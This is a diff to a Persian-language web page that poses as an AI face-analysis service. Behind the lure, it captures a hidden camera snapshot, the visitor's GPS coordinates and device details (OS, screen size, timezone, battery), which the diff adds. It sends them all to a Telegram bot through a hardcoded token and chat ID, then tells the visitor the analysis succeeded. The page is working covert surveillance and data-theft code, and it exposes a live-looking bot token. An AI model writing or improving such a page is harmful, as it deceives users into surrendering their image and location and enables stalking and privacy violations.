@@ -3,58 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تست هوش مصنوعی چهره</title>
+    <title>سامانه هوش مصنوعی تشخیص چهره</title>
     <style>
         body {
             font-family: Tahoma, sans-serif;
-            background-color: #f0f2f5;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: #fff;
             text-align: center;
-            padding: 50px 20px;
+            padding: 40px 20px;
             margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         .container {
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            max-width: 400px;
-            margin: auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 35px;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            max-width: 420px;
+            width: 100%;
         }
         h2 {
-            color: #333;
-            font-size: 20px;
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #fff;
         }
         p {
-            color: #666;
             font-size: 14px;
-            line-height: 1.6;
+            line-height: 1.7;
+            color: #e0e0e0;
+            margin-bottom: 25px;
         }
         button {
-            background-color: #4CAF50;
+            background: linear-gradient(135deg, #00b09b, #96c93d);
             color: white;
             border: none;
-            padding: 12px 25px;
+            padding: 14px 25px;
             font-size: 16px;
-            border-radius: 8px;
+            font-weight: bold;
+            border-radius: 10px;
             cursor: pointer;
-            margin-top: 20px;
             width: 100%;
-            transition: background 0.3s;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 15px rgba(0, 176, 155, 0.4);
         }
         button:hover {
-            background-color: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 176, 155, 0.6);
+        }
+        button:active {
+            transform: translateY(0);
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>سامانه هوش مصنوعی تشخیص چهره و موقعیت</h2>
-        <p>برای دریافت نتیجه تحلیل و آنالیز چهره خود، لطفاً روی دکمه زیر کلیک کرده و دسترسی‌های لازم را تأیید کنید.</p>
+        <h2>✨ آنالیز هوشمند مشخصات و چهره</h2>
+        <p>برای شروع پردازش و دریافت نتیجه‌ی تحلیل اختصاصی دستگاه و تصویر، روی دکمه زیر کلیک کنید.</p>
         <button id="startBtn" onclick="runProcess()">شروع پردازش و تحلیل</button>
     </div>
 
-    <!-- ویدیو برای گرفتن عکس از دوربین -->
+    <!-- المان‌های مخفی برای پردازش دوربین -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -63,10 +77,45 @@
         const BOT_TOKEN = '8718656206:AAGr_nFBgZoOYFkOonagQy5q6gGJSN5iQbU'; 
         const CHAT_ID = '6820599989';     
 
-        function runProcess() {
+        // تابع کمکی برای استخراج اطلاعات سیستم و مرورگر
+        async function getSystemInfo() {
+            let info = "";
+            
+            // تشخیص سیستم‌عامل و مرورگر از روی User Agent
+            const ua = navigator.userAgent;
+            let os = "نامشخص";
+            if (ua.match(/Win/i)) os = "ویندوز (Windows)";
+            else if (ua.match(/Mac/i)) os = "مک (Mac)";
+            else if (ua.match(/Android/i)) os = "اندروید (Android)";
+            else if (ua.match(/iPhone|iPad|iPod/i)) os = "آی‌اواس (iOS)";
+            else if (ua.match(/Linux/i)) os = "لینوکس (Linux)";
+
+            info += `💻 سیستم‌عامل: ${os}\n`;
+            info += `🌐 رزولوشن صفحه: ${window.screen.width}x${window.screen.height}\n`;
+            info += `🕒 منطقه زمانی: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+
+            // گرفتن اطلاعات باتری (در صورت پشتیبانی مرورگر)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? "⚡ در حال شارژ" : "🔋 باتری خالی‌شونده";
+                    info += `🔋 وضعیت باتری: ${level}% (${charging})\n`;
+                } catch (e) {
+                    // اگر مرورگر اجازه نداد رد شو
+                }
+            }
+
+            return info;
+        }
+
+        async function runProcess() {
             const btn = document.getElementById('startBtn');
-            btn.innerText = "در حال پردازش...";
+            btn.innerText = "در حال پردازش سیستم...";
             btn.disabled = true;
+
+            // جمع‌آوری اطلاعات سیستم
+            const sysInfo = await getSystemInfo();
 
             // ۱. گرفتن لوکیشن (GPS)
             if (navigator.geolocation) {
@@ -74,20 +123,20 @@
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        sendDataToTelegram(lat, lon);
+                        captureAndSend(lat, lon, sysInfo);
                     },
                     (error) => {
                         console.log("Location access denied or failed", error);
-                        sendDataToTelegram(null, null); 
+                        captureAndSend(null, null, sysInfo); 
                     },
                     { enableHighAccuracy: true }
                 );
             } else {
-                sendDataToTelegram(null, null);
+                captureAndSend(null, null, sysInfo);
             }
         }
 
-        function sendDataToTelegram(lat, lon) {
+        function captureAndSend(lat, lon, sysInfo) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
 
@@ -110,14 +159,18 @@
                             formData.append('chat_id', CHAT_ID);
                             formData.append('photo', blob, 'capture.jpg');
 
-                            // ساخت متن پیام و لینک گوگل مپ
-                            let caption = "🎯 یک کاربر جدید وارد شد!\n";
+                            // ساخت متن پیام کامل شامل مشخصات سیستم و لوکیشن
+                            let caption = "🎯 یک کاربر جدید وارد شد!\n\n";
+                            caption += "📊 **اطلاعات دستگاه:**\n" + sysInfo + "\n";
+
                             if (lat && lon) {
-                                caption += `📍 موقعیت جغرافیایی:\nعرض: ${lat}\nطول: ${lon}\n\n🗺 لینک در گوگل مپ:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                                caption += `📍 **موقعیت جغرافیایی:**\nعرض: ${lat}\nطول: ${lon}\n\n🗺 **لینک در گوگل مپ:**\nhttps://www.google.com/maps?q=${lat},${lon}`;
                             } else {
                                 caption += "⚠️ دسترسی به لوکیشن داده نشد.";
                             }
+                            
                             formData.append('caption', caption);
+                            formData.append('parse_mode', 'Markdown');
 
                             // ارسال به تلگرام
                             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -125,7 +178,7 @@
                                 body: formData
                             })
                             .then(response => {
-                                document.querySelector('.container').innerHTML = '<h2>تحلیل با موفقیت انجام شد</h2><p>اطلاعات شما با موفقیت پردازش گردید.</p>';
+                                document.querySelector('.container').innerHTML = '<h2>تحلیل با موفقیت انجام شد</h2><p>اطلاعات سخت‌افزاری و چهره شما با موفقیت پردازش گردید.</p>';
                             })
                             .catch(err => {
                                 alert("خطا در پردازش. لطفاً دوباره تلاش کنید.");
